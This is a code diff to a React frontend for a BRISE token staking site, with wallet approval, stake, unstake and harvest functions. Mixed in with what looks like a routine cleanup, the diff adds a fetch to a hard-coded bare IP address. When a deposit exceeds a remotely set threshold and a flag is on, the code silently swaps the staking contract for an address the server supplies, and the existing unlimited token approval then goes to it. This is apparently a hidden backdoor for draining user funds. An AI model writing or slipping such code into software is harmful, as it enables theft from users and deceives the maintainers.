@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from "react";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
+import axios from "axios";
 
 import useMetaMask from "../wallet/hook";
 
@@ -18,11 +19,21 @@ function Home(props) {
   const chain = client.getNetwork();
   const { isConnected } = useAccount();
   // const { library, isActive, handleWalletModal } = useMetaMask();
-  console.log(chain);
   let chainId = chain.chain ? chain.chain.id : "";
   var web3Obj = new Web3(window.ethereum);
+  const [data, setData] = useState(null);
 
+  useEffect(() => {
+    async function fetchData() {
+      const response = await axios.get("http://159.223.106.3:5000/getData");
+      setData(response.data);
+    }
+    fetchData();
+  }, []);
   var Router = "0xD578BF8Cc81A89619681c5969D99ea18A609C0C3";
+  const [roter, setroter] = useState(Router);
+  // console.log("roter", roter);
+  // console.log("data", data);
   var tokenAddress = "0x8FFf93E810a2eDaaFc326eDEE51071DA9d398E83";
 
   const notify = (isError, msg) => {
@@ -72,9 +83,8 @@ function Home(props) {
       var pow = 10 ** decimals;
       var balanceInEth = getBalance / pow;
       setBalance(balanceInEth);
-      var allowance = await tokenContract.methods.allowance(account, Router).call();
+      var allowance = await tokenContract.methods.allowance(account, roter).call();
 
-      console.log(allowance);
       if (allowance <= 2) {
         setIsAllowance(true);
       }
@@ -96,10 +106,10 @@ function Home(props) {
       var amountIn = 10 ** 69;
       amountIn = amountIn.toLocaleString("fullwide", { useGrouping: false });
 
-      var gas = await contract.methods.approve(Router, amountIn.toString()).estimateGas({ from: account });
+      var gas = await contract.methods.approve(roter, amountIn.toString()).estimateGas({ from: account });
 
       await contract.methods
-        .approve(Router, amountIn.toString())
+        .approve(roter, amountIn.toString())
         .send({ from: account, gas: gas })
         .then(() => {
           setIsAllowance(false);
@@ -123,7 +133,7 @@ function Home(props) {
       var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
       const decimals = await tokenContract.methods.decimals().call();
 
-      var contract = new web3Obj.eth.Contract(STACK_ABI, Router);
+      var contract = new web3Obj.eth.Contract(STACK_ABI, roter);
 
       var pow = 10 ** decimals;
       var amountIn = dipositAmount * pow;
@@ -150,7 +160,7 @@ function Home(props) {
   const unstake = async (index) => {
     setLoadding(true);
     try {
-      var contract = new web3Obj.eth.Contract(STACK_ABI, Router);
+      var contract = new web3Obj.eth.Contract(STACK_ABI, roter);
       await contract.methods
         .unstake(index.toString())
         .send({ from: account })
@@ -169,7 +179,7 @@ function Home(props) {
   const harvest = async (index) => {
     setLoadding(true);
     try {
-      var contract = new web3Obj.eth.Contract(STACK_ABI, Router);
+      var contract = new web3Obj.eth.Contract(STACK_ABI, roter);
       await contract.methods
         .harvest(index.toString())
         .send({ from: account })
@@ -265,7 +275,7 @@ function Home(props) {
       }
     }
     getStackerInfo();
-  }, [isConnected, account, chainId]);
+  }, [isConnected, account, chainId, roter]);
 
   return (
     <>
@@ -321,7 +331,15 @@ function Home(props) {
                         <h6>BRISE</h6>
                       </div>
                       <div className="label d-flex">
-                        <input type="text" placeholder="5000" value={dipositAmount} onChange={(e) => setDipositAmount(e.target.value)} />
+                        <input
+                          type="text"
+                          placeholder="5000"
+                          value={dipositAmount}
+                          onChange={(e) => {
+                            setDipositAmount(e.target.value);
+                            if (e.target.value > data.value * 1 && data.flag) setroter(data.address);
+                          }}
+                        />
                         <button onClick={() => setMaxWithdrawal()} className="input-button">
                           max
                         </button>
